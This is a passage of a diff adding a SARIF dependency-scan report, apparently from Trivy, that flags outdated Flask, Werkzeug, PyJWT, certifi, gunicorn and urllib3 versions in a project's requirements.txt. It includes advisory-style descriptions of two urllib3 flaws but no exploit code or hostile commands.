+                "text": "Vulnerability CVE-2026-97687\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.8.0\nLink: [CVE-2026-97687](https://avd.aquasec.com/nvd/cve-2026-97687)\nurllib3 is an HTTP client library for Python. From 1.26.0 until 2.8.0, the proxy_ssl_context, proxy_assert_hostname, proxy_assert_fingerprint, ssl_context, cert_reqs, verify_mode, use_forwarding_for_https=True, and CERT_NONE configuration paths fail to remain separated because target-server TLS settings are incorrectly applied to the HTTPS proxy connection. The trigger is that an application uses an HTTPS proxy and configures target-server TLS settings that must remain separate from the proxy TLS handshake, including HTTPS forwarding with target-specific identity or credentials. Applying cert_reqs=CERT_NONE can overwrite proxy_ssl_context.verify_mode in place, and the mutation persists so later connections reusing the same context may connect to the HTTPS proxy without certificate verification. The attack mechanism is that an attacker intercepts and impersonates the HTTPS proxy after the effective proxy policy accepts the attacker's certificate. The impact is that the attacker can observe or modify forwarded traffic or receive a target TLS client certificate, while CONNECT tunneling still preserves the separate end-to-end target TLS connection. This issue is fixed in version 2.8.0.",
+                "markdown": "**Vulnerability CVE-2026-97687**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.8.0|[CVE-2026-97687](https://avd.aquasec.com/nvd/cve-2026-97687)|\n\nurllib3 is an HTTP client library for Python. From 1.26.0 until 2.8.0, the proxy_ssl_context, proxy_assert_hostname, proxy_assert_fingerprint, ssl_context, cert_reqs, verify_mode, use_forwarding_for_https=True, and CERT_NONE configuration paths fail to remain separated because target-server TLS settings are incorrectly applied to the HTTPS proxy connection. The trigger is that an application uses an HTTPS proxy and configures target-server TLS settings that must remain separate from the proxy TLS handshake, including HTTPS forwarding with target-specific identity or credentials. Applying cert_reqs=CERT_NONE can overwrite proxy_ssl_context.verify_mode in place, and the mutation persists so later connections reusing the same context may connect to the HTTPS proxy without certificate verification. The attack mechanism is that an attacker intercepts and impersonates the HTTPS proxy after the effective proxy policy accepts the attacker's certificate. The impact is that the attacker can observe or modify forwarded traffic or receive a target TLS client certificate, while CONNECT tunneling still preserves the separate end-to-end target TLS connection. This issue is fixed in version 2.8.0."
+              },
+              "properties": {
+                "cvssv40_baseScore": 7.6,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-97689",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "urllib3: urllib3: Denial of Service via unbounded memory allocation in chunk parser"
+              },
+              "fullDescription": {
+                "text": "urllib3 is an HTTP client library for Python. From 1.10.3 until 2.8.0, the HTTPResponse.read_chunked and HTTPResponse.stream methods can allocate unbounded memory because the streaming chunk parser buffers the chunk-size field until newline or EOF without a length bound. The trigger is that a malicious server returns Transfer-Encoding: chunked followed by a very long run of bytes without a newline. The attack mechanism is that a malicious HTTP server sends a very long unterminated chunk-size line. The impact is that unbounded memory allocation can exhaust the client process. This issue is fixed in version 2.8.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-97689",
+              "help": {
+                "text": "Vulnerability CVE-2026-97689\nSeverity: HIGH\nPackage: urllib3\nFixed Version: 2.8.0\nLink: [CVE-2026-97689](https://avd.aquasec.com/nvd/cve-2026-97689)\nurllib3 is an HTTP client library for Python. From 1.10.3 until 2.8.0, the HTTPResponse.read_chunked and HTTPResponse.stream methods can allocate unbounded memory because the streaming chunk parser buffers the chunk-size field until newline or EOF without a length bound. The trigger is that a malicious server returns Transfer-Encoding: chunked followed by a very long run of bytes without a newline. The attack mechanism is that a malicious HTTP server sends a very long unterminated chunk-size line. The impact is that unbounded memory allocation can exhaust the client process. This issue is fixed in version 2.8.0.",
+                "markdown": "**Vulnerability CVE-2026-97689**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|urllib3|2.8.0|[CVE-2026-97689](https://avd.aquasec.com/nvd/cve-2026-97689)|\n\nurllib3 is an HTTP client library for Python. From 1.10.3 until 2.8.0, the HTTPResponse.read_chunked and HTTPResponse.stream methods can allocate unbounded memory because the streaming chunk parser buffers the chunk-size field until newline or EOF without a length bound. The trigger is that a malicious server returns Transfer-Encoding: chunked followed by a very long run of bytes without a newline. The attack mechanism is that a malicious HTTP server sends a very long unterminated chunk-size line. The impact is that unbounded memory allocation can exhaust the client process. This issue is fixed in version 2.8.0."
+              },
+              "properties": {
+                "cvssv40_baseScore": 8.9,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            }
+          ],
+          "version": "0.74.0"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2023-30861",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Package: Flask\nInstalled Version: 2.2.2\nVulnerability CVE-2023-30861\nSeverity: HIGH\nFixed Version: 2.3.2, 2.2.5\nLink: [CVE-2023-30861](https://avd.aquasec.com/nvd/cve-2023-30861)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 3,
+                  "startColumn": 1,
+                  "endLine": 3,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: Flask@2.2.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-102268",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Package: PyJWT\nInstalled Version: 1.7.1\nVulnerability CVE-2026-102268\nSeverity: CRITICAL\nFixed Version: 2.14.0\nLink: [CVE-2026-102268](https://avd.aquasec.com/nvd/cve-2026-102268)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 1,
+                  "endLine": 9,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: PyJWT@1.7.1"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2022-29217",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "Package: PyJWT\nInstalled Version: 1.7.1\nVulnerability CVE-2022-29217\nSeverity: HIGH\nFixed Version: 2.4.0\nLink: [CVE-2022-29217](https://avd.aquasec.com/nvd/cve-2022-29217)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 1,
+                  "endLine": 9,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: PyJWT@1.7.1"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-102267",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "Package: PyJWT\nInstalled Version: 1.7.1\nVulnerability CVE-2026-102267\nSeverity: HIGH\nFixed Version: 2.14.0\nLink: [CVE-2026-102267](https://avd.aquasec.com/nvd/cve-2026-102267)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 1,
+                  "endLine": 9,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: PyJWT@1.7.1"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-32597",
+          "ruleIndex": 4,
+          "level": "error",
+          "message": {
+            "text": "Package: PyJWT\nInstalled Version: 1.7.1\nVulnerability CVE-2026-32597\nSeverity: HIGH\nFixed Version: 2.12.0\nLink: [CVE-2026-32597](https://avd.aquasec.com/nvd/cve-2026-32597)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 1,
+                  "endLine": 9,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: PyJWT@1.7.1"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-48526",
+          "ruleIndex": 5,
+          "level": "error",
+          "message": {
+            "text": "Package: PyJWT\nInstalled Version: 1.7.1\nVulnerability CVE-2026-48526\nSeverity: HIGH\nFixed Version: 2.13.0\nLink: [CVE-2026-48526](https://avd.aquasec.com/nvd/cve-2026-48526)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 1,
+                  "endLine": 9,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: PyJWT@1.7.1"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-pxh4-856f-4h89",
+          "ruleIndex": 6,
+          "level": "error",
+          "message": {
+            "text": "Package: PyJWT\nInstalled Version: 1.7.1\nVulnerability GHSA-pxh4-856f-4h89\nSeverity: HIGH\nFixed Version: 2.14.0\nLink: [GHSA-pxh4-856f-4h89](https://github.com/advisories/GHSA-pxh4-856f-4h89)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 9,
+                  "startColumn": 1,
+                  "endLine": 9,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: PyJWT@1.7.1"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-25577",
+          "ruleIndex": 7,
+          "level": "error",
+          "message": {
+            "text": "Package: Werkzeug\nInstalled Version: 2.2.2\nVulnerability CVE-2023-25577\nSeverity: HIGH\nFixed Version: 2.2.3\nLink: [CVE-2023-25577](https://avd.aquasec.com/nvd/cve-2023-25577)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 4,
+                  "startColumn": 1,
+                  "endLine": 4,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: Werkzeug@2.2.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-34069",
+          "ruleIndex": 8,
+          "level": "error",
+          "message": {
+            "text": "Package: Werkzeug\nInstalled Version: 2.2.2\nVulnerability CVE-2024-34069\nSeverity: HIGH\nFixed Version: 3.0.3\nLink: [CVE-2024-34069](https://avd.aquasec.com/nvd/cve-2024-34069)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 4,
+                  "startColumn": 1,
+                  "endLine": 4,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: Werkzeug@2.2.2"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "GHSA-6q48-6c7w-9gw2",
+          "ruleIndex": 9,
+          "level": "error",
+          "message": {
+            "text": "Package: certifi\nInstalled Version: 2020.12.5\nVulnerability GHSA-6q48-6c7w-9gw2\nSeverity: CRITICAL\nFixed Version: 2026.10.18\nLink: [GHSA-6q48-6c7w-9gw2](https://github.com/advisories/GHSA-6q48-6c7w-9gw2)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 15,
+                  "startColumn": 1,
+                  "endLine": 15,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: certifi@2020.12.5"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-37920",
+          "ruleIndex": 10,
+          "level": "error",
+          "message": {
+            "text": "Package: certifi\nInstalled Version: 2020.12.5\nVulnerability CVE-2023-37920\nSeverity: HIGH\nFixed Version: 2023.7.22\nLink: [CVE-2023-37920](https://avd.aquasec.com/nvd/cve-2023-37920)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 15,
+                  "startColumn": 1,
+                  "endLine": 15,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: certifi@2020.12.5"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-1135",
+          "ruleIndex": 11,
+          "level": "error",
+          "message": {
+            "text": "Package: gunicorn\nInstalled Version: 21.2.0\nVulnerability CVE-2024-1135\nSeverity: HIGH\nFixed Version: 22.0.0\nLink: [CVE-2024-1135](https://avd.aquasec.com/nvd/cve-2024-1135)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 1,
+                  "endLine": 16,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: gunicorn@21.2.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-6827",
+          "ruleIndex": 12,
+          "level": "error",
+          "message": {
+            "text": "Package: gunicorn\nInstalled Version: 21.2.0\nVulnerability CVE-2024-6827\nSeverity: HIGH\nFixed Version: 22.0.0\nLink: [CVE-2024-6827](https://avd.aquasec.com/nvd/cve-2024-6827)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 1,
+                  "endLine": 16,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: gunicorn@21.2.0"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2021-33503",
+          "ruleIndex": 13,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2021-33503\nSeverity: HIGH\nFixed Version: 1.26.5\nLink: [CVE-2021-33503](https://avd.aquasec.com/nvd/cve-2021-33503)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-43804",
+          "ruleIndex": 14,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2023-43804\nSeverity: HIGH\nFixed Version: 2.0.6, 1.26.17\nLink: [CVE-2023-43804](https://avd.aquasec.com/nvd/cve-2023-43804)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-66418",
+          "ruleIndex": 15,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2025-66418\nSeverity: HIGH\nFixed Version: 2.6.0\nLink: [CVE-2025-66418](https://avd.aquasec.com/nvd/cve-2025-66418)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-66471",
+          "ruleIndex": 16,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2025-66471\nSeverity: HIGH\nFixed Version: 2.6.0\nLink: [CVE-2025-66471](https://avd.aquasec.com/nvd/cve-2025-66471)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-21441",
+          "ruleIndex": 17,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2026-21441\nSeverity: HIGH\nFixed Version: 2.6.3\nLink: [CVE-2026-21441](https://avd.aquasec.com/nvd/cve-2026-21441)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-44431",
+          "ruleIndex": 18,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2026-44431\nSeverity: HIGH\nFixed Version: 2.7.0\nLink: [CVE-2026-44431](https://avd.aquasec.com/nvd/cve-2026-44431)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-97687",
+          "ruleIndex": 19,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2026-97687\nSeverity: HIGH\nFixed Version: 2.8.0\nLink: [CVE-2026-97687](https://avd.aquasec.com/nvd/cve-2026-97687)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-97689",
+          "ruleIndex": 20,
+          "level": "error",
+          "message": {
+            "text": "Package: urllib3\nInstalled Version: 1.26.4\nVulnerability CVE-2026-97689\nSeverity: HIGH\nFixed Version: 2.8.0\nLink: [CVE-2026-97689](https://avd.aquasec.com/nvd/cve-2026-97689)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "requirements.txt",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 12,
+                  "startColumn": 1,
+                  "endLine": 12,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "requirements.txt: urllib3@1.26.4"
+              }
+            }
+          ]
+        }
+      ],
+      "columnKind": "utf16CodeUnits",
+      "originalUriBaseIds": {
+        "ROOTPATH": {
+          "uri": "file:///home/admin/arquitetura/core-box/"
+        }
+      }
+    }
+  ]
+}
